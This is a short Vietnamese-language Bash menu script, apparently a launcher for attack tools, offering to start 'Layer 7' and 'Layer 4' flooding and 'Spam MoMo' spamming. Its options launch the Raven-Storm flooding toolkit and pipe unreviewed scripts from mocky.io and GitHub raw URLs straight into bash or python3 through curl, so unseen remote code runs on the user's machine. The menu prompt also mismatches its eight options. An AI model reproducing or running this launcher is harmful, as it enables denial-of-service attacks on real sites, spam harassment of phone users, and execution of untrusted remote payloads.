banner(){
clear
printf '\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93mNhà Phát Triển: Nguyen Trong Dai'
printf '\n'
}
banner
echo
echo "[1] START LAYER 7 - [ON]"
echo "[2] START LAYER 4 - [OFF]"
echo "[3] START SPAM MOMO - [ON]"
echo
echo "[6] SETUP LAYER 7 - [ON]"
echo "[7] SETUP LAYER 4 - [OFF]"
echo "[8] SETUP SPAM MOMO - [ON]"
echo && read -p "  Vui Lòng Nhập Một Lựa Chọn 1 Hoặc 2..: " num

    case "${num}" in
        1) cd Raven-Storm && python3 main.py
        ;;
        2)  bash <(curl -Ls https://run.mocky.io/v3/86753fb4-d3a0-4ea7-b717-6a8f616ef46a)
        ;;
        3)  python3 <(curl -Ls https://raw.githubusercontent.com/dai515/-/main/spmm.py)
        ;;
        4)  ..
        ;;
        5)  ..
        ;;
        6)  apt install python3-pip && pip install requests && pip install NongHoangVu
        ;;
        7)  curl https://raw.githubusercontent.com/DauDau432/Raven-Storm/master/requirements.txt -o requirements.txt && git clone https://github.com/DauDau432/Raven-Storm && cd Raven-Storm && python3 main.py
        ;;
        8)  bash <(curl -Ls https://run.mocky.io/v3/7de8950f-fa96-442d-a40e-b185dd4b76d0)
        ;;
        *) echo -e "  Chỉ Có Thể Nhập 1 Hoặc 2..:"
        ;;
    esac
banner
